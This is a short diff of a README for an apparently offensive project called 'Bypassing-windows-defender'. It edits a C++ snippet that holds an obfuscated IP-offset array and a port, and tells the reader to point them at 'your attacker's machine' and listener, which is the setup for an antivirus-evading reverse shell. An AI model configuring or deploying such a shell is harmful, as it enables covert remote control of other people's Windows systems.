@@ -64,6 +64,6 @@ cd Bypassing-windows-defender
 ### Modify the IP address and port in the source code to match your attacker's machine:
 
 ```cpp
-int ipaddr_offset[] = { 0, 9, 1, 7, 0, 5, 8, 7, 4, 5, 7, 0, 10, 3 }; //192.168.1.58   // Change this to your IP
+int ipaddr_offset[] = { 0, 9, 1, 7, 0, 5, 8, 7, 0, 7, 4, 8 }; //192.168.1.58   // Change this to your IP
 short port = 4444;                       // Change this to your listener port
 ```
